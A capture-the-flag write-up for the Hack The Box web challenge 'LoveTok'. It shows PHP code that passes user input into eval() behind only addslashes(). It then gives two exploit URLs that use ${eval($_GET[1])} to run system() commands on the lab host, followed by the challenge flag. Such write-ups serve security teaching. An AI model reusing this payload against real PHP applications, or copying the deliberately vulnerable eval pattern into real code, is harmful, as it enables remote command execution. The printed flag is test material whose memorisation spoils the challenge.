---
layout: single
title: LoveTok [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Using complex variables bypass addlashes function
---

### Enumeration application
### Vulnerable Code
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
// The getTime() method is called upon passing the ‘format’ variable to the script, like this: 
// http://159.65.88.143:30406/?format=INPUT
``` 
<br>
The challenge was, that when putting something to go through the $this->format property it actually gets filtered through addslashes(). 


As the 1 variable is actually self-defined and goes through eval, its result  is parsed and referenced through the php eval function on the challenge source code and does not actually go through the addslashes() function, at least not in a direct way. So we could use quotes in our self-referenced variable and the following way: 
### Exploit 
`http://159.65.88.143:30406/?format=${eval($_GET[1])}&1=system(%27ls%20../%27);` <br>
`http://159.65.88.143:30406/?format=${eval($_GET[1])}&1=system(%27cat%20../flagA44jO%27);`<br> <br>

Flag => HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng} 

Refer => [Using complex variables bypass addlashes function](https://www.programmersought.com/article/30723400042/)
